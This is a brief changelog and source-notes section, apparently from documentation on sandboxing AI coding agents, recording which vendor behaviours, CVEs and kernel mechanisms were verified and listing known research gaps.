**Source research**: `~/.claude/local/research-notes/sandboxing-orchestration.md` (shared with `agent-orchestration`; claims tagged VERIFIED / FOUND-UNVERIFIED / INFERRED, with a seventeen-item gaps list). Read it before a refresh: it records which vendor pages were fetched, that Apple's documentation defeated both plain fetching and a headless browser, and what was left unverified and why.

- **2026-09-10** -- Initial version. Vendor behavior verified against Claude Code 2.1.267, Codex rust-v0.154.0, Cursor's 2026-02-18 post and run-modes doc, Aider source, OpenHands docs. CVEs verified at NVD. Kernel mechanisms verified at docs.kernel.org and man7. `sandbox-exec` deprecation measured on macOS 26.5. Known gaps: Apple TCC and App Sandbox specifics (documentation unreachable), Endpoint Security entitlement (symbols only), `launchd` constraints (not researched), SSH agent / gpg-agent / Keychain reachability inside each sandbox (untested), Codex Landlock-fallback trigger, Landlock ABI 10 and 11 kernel versions, firejail CVE specifics.
